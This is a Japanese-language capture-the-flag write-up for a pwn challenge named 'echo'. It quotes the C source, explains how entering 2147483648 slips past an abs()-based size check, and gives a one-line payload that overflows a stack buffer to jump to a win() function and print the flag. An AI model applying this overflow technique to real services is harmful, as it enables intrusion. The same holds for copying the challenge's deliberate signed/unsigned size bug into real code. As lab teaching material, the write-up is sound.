# echo:Pwn:129pts
A service for reachability check.  

[echo.tar.gz](echo.tar.gz)  

`nc 34.170.146.252 17360`  

# Solution
ソースと接続先が渡される。  
```bash
$ nc 34.170.146.252 17360
Size: 6
Data: Satoki
Received: Satoki
```
接続すると`Size`と`Data`を入力でき、`Received`として受け取ったデータが表示される。  
ソースは以下の通りであった。  
```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#define BUF_SIZE 0x100

/* Call this function! */
void win() {
  char *args[] = {"/bin/cat", "/flag.txt", NULL};
  execve(args[0], args, NULL);
  exit(1);
}

int get_size() {
  // Input size
  int size = 0;
  scanf("%d%*c", &size);

  // Validate size
  if ((size = abs(size)) > BUF_SIZE) {
    puts("[-] Invalid size");
    exit(1);
  }

  return size;
}

void get_data(char *buf, unsigned size) {
  unsigned i;
  char c;

  // Input data until newline
  for (i = 0; i < size; i++) {
    if (fread(&c, 1, 1, stdin) != 1) break;
    if (c == '\n') break;
    buf[i] = c;
  }
  buf[i] = '\0';
}

void echo() {
  int size;
  char buf[BUF_SIZE];

  // Input size
  printf("Size: ");
  size = get_size();

  // Input data
  printf("Data: ");
  get_data(buf, size);

  // Show data
  printf("Received: %s\n", buf);
}

int main() {
  setbuf(stdin, NULL);
  setbuf(stdout, NULL);
  echo();
  return 0;
}
```
`win`関数が見えるため、BOFでそちらに飛ばす問題だとわかる。  
`get_size`では入力の絶対値が`BUF_SIZE`(`0x100`)を超えている場合に終了してしまう。  
intであるので、最大値より大きい`2147483648`を入力するとオーバーフローにより`-2147483648`となる。  
これに`abs`関数を用いても、なぜかマイナスのままとなり`0x100`との比較を突破できる。  
さらに`get_data`の`size`は`unsigned`であるので、`2147483648`はそのままの数値として扱われる。  
つまりバッファ`0x100`を超えて書き込みができる。  
以下のように`win`へ飛ばせばよい。  
```bash
$ gdb -q ./echo
~~~
pwndbg> disass win
Dump of assembler code for function win:
   0x00000000004011f6 <+0>:     endbr64
   0x00000000004011fa <+4>:     push   rbp
   0x00000000004011fb <+5>:     mov    rbp,rsp
   0x00000000004011fe <+8>:     sub    rsp,0x20
~~~
$ echo -e '2147483648\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xf6\x11\x40\x00' | nc 34.170.146.252 17360
Size: Data: Received: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�@
Alpaca{s1Gn3d_4Nd_uNs1gn3d_s1zEs_c4n_cAu5e_s3ri0us_buGz}
```
flagが得られた。  

## Alpaca{s1Gn3d_4Nd_uNs1gn3d_s1zEs_c4n_cAu5e_s3ri0us_buGz}